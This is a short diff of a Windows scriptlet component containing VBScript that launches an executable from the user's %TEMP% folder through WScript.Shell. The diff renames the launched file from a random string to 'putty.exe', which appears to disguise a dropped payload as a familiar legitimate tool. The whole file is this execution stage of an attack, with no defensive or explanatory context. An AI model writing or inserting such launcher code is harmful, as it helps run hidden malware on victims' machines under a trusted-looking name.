@@ -1,6 +1,6 @@
 <component>
 <script language="VBScript">
 Set shell=CreateObject("wscript.shell")
-shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\3333333123123123123.exe")
+shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\putty.exe")
 </script>
 </component>
